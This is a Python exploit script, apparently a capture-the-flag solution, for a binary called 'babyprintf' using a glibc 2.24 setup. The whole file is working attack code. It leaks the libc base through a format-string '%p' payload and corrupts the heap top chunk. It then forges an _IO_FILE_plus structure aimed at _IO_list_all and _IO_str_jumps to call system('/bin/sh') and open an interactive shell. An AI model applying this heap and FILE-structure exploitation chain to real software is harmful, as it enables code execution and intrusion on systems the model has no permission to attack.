# File: exp.py
# Author: raycp
# Date: 2019-05-16
# Description: exp for babyprintf

from pwn_debug.pwn_debug import *
from pwn_debug.IO_FILE_plus import *
pdbg=pwn_debug("babyprintf")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.debug("2.24")
pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print type(pdbg.membp)
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
def write_one(size,data):
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("string: ")
    p.sendline(data)
    p.recvuntil("result: ")
def pwn():

    #pdbg.bp([0x4007f0])
    # step 1 leaking libc address and overwrite top chunk size
    data="%p%p%p%p%p**%p**"
    data=data.ljust(0x2f8,'*')+p64(0xd01)
    write_one(0x2f0,data)
    p.recvuntil("**")
    libc_base=int(p.recvuntil("**")[:-2],16)-libc.symbols['__libc_start_main']-240
    io_list_all=libc_base+libc.symbols['_IO_list_all']
    io_str_jumps=libc_base+libc.symbols['_IO_str_jumps']
    binsh_addr=libc_base+next(libc.search("/bin/sh"))
    system_addr=libc_base+libc.symbols['system']
    log.info("leaking libc base: %s"%hex(libc_base))
    #pdbg.bp()
    
    # step 2 trigger sysmalloc
    write_one(0x1000,'a')

    
    fake_file=IO_FILE_plus()
    fake_file._IO_read_ptr=0x61
    fake_file._IO_read_base=io_list_all-0x10
    fake_file._IO_buf_base=binsh_addr
    fake_file._IO_write_ptr=1
    fake_file.vtable=io_str_jumps-8

    fake_file.show()
    fake_file.str_finish_check()
    file_data=str(fake_file)+p64(system_addr)*2

    #fake_chunk=p64(0)+p64(0x61)+p64(io_list_all-0x10)*2
    payload='a'*0x2f0
    payload+=file_data
    ## step 3 overwrite unsorted->bk
    write_one(0x2f0,payload)
    #pdbg.bp(0x4007d2)
    ## step 4 malloc again, trigger unsorted attack and _IO_flush_all_lokcp
    p.recvuntil("size: ")
    p.sendline('1')
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()


